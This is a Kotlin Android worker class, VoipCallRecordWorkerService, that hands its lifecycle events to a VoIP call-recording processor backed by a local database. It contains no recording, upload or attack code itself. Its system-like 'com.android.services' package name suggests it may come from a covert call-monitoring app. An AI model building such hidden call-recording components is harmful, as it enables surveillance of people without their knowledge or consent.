package com.android.services.workers.voip

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.workers.base.BaseWorker
import com.android.services.workers.callRecord.CallRecordProcessingBase
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.CoroutineScope

@HiltWorker
class VoipCallRecordWorkerService @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) :
    BaseWorker(context, parameters, VoipCallRecordProcessingBase.TAG_VOIP_CALL_RECORDING_WORKER) {
    private lateinit var voipCallRecordProcessingBaseImpll: IWorkerProcessing
    override fun onCreate() {
        voipCallRecordProcessingBaseImpll =
            VoipCallRecordProcessingBaseImpll(context, localDatabaseSource, coroutineScope)
        voipCallRecordProcessingBaseImpll.onCreate()
    }

    override fun onStartCommand() {
        voipCallRecordProcessingBaseImpll.onStartCommand(inputData)
    }

    override fun onStop() {
        voipCallRecordProcessingBaseImpll.onDestroy()
    }
}